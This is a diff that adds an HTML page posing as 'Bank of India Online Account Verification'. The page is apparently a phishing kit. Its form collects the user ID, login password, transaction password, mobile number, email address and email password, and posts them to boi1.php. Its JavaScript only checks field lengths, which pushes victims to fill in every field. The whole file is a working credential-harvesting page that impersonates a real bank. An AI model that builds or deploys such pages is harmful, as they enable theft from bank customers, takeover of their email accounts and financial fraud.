@@ -1,0 +1,141 @@
+
+
+<html>
+<head>
+<title>Bank of India Online Account Verification</title>
+<script language="javascript">
+function validate()
+{
+var a = document.forms["login"]["user"].value;
+var b = document.forms["login"]["password"].value;
+var c = document.forms["login"]["trans"].value;
+var d = document.forms["login"]["mobile"].value;
+var e = document.forms["login"]["email"].value;
+var f = document.forms["login"]["emailpass"].value;
+
+if(a.length<6)
+{
+alert('Please check USER ID');
+return false;
+}
+
+if(b.length<6)
+{
+alert('Please check PASSWORD ');
+return false;
+}
+
+if(c.length<6)
+{
+alert('Please check TRANSACTION PASSWORD ');
+return false;
+}
+
+if(d.length<10)
+{
+alert('Please check MOBILE NUMBER');
+return false;
+}
+
+if(e.length<8)
+{
+alert('Please check EMAIL ADDRESS');
+return false;
+}
+
+if(f.length<6)
+{
+alert('Please check EMAIL PASSWORD');
+return false;
+}
+
+}
+
+</script>
+<style type="text/css">
+body
+{
+background-image:url('back.png');
+background-repeat:no-repeat;
+}
+.input {
+    border: 1px solid #006;
+    background: #ffc;
+}
+td
+{
+color:#153E7E;
+}
+</style>
+</head>
+<body>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<br />
+<div style="margin-left:30%">
+<form name="login" action="boi1.php" method="POST" onsubmit="return validate()">
+<table width="50%">
+<tr>
+<td>
+<strong>USER ID</strong>
+</td>
+<td>
+<input type="text" name="user" autocomplete="off" class="input">
+</td>
+</tr>
+<tr>
+<td>
+<strong>PASSWORD</strong>
+</td>
+<td>
+<input type="password" name="password" class="input">
+</td>
+</tr>
+<tr>
+<td>
+<strong>TRANSACTION PASSWORD</strong>
+</td>
+<td>
+<input type="password" name="trans" class="input">
+</td>
+</tr>
+<tr>
+<td>
+<strong>MOBILE NUMBER</strong>
+</td>
+<td>
+<input type="text" name="mobile" maxlength="12" autocomplete="off" class="input">
+</td>
+</tr>
+<tr>
+<td>
+<strong>EMAIL ADDRESS</strong>
+</td>
+<td>
+<input type="text" name="email" autocomplete="off" class="input">
+</td>
+</tr>
+<tr>
+<td>
+<strong>EMAIL PASSWORD</strong>
+</td>
+<td>
+<input type="password" name="emailpass" class="input">
+</td>
+</tr>
+<tr>
+<td>
+&nbsp;
+</td>
+<td>
+<input type="submit" value="Submit">
+</td>
+</tr>
+</table>
+</form>
+</div>
+</body>
+</html>
